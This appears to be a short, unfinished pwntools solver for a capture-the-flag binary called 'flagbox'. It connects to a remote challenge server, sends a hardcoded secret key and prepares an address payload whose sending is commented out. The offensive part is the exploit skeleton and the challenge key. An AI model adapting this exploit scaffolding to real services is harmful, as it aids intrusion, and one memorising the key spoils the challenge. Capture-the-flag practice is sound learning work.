from pwn import *

#p = process('./flagbox')
p = remote("0x0.site", 12208)
e = ELF('./flagbox')
l = e.libc

context.log_level = "debug"

key = '7hi5_iS_S3cr3t!!'
p.sendlineafter('key : ', key)

payload = p64(0x6020e0)
#p.sendafter("where did you get it? : ", payload)

p.interactive()
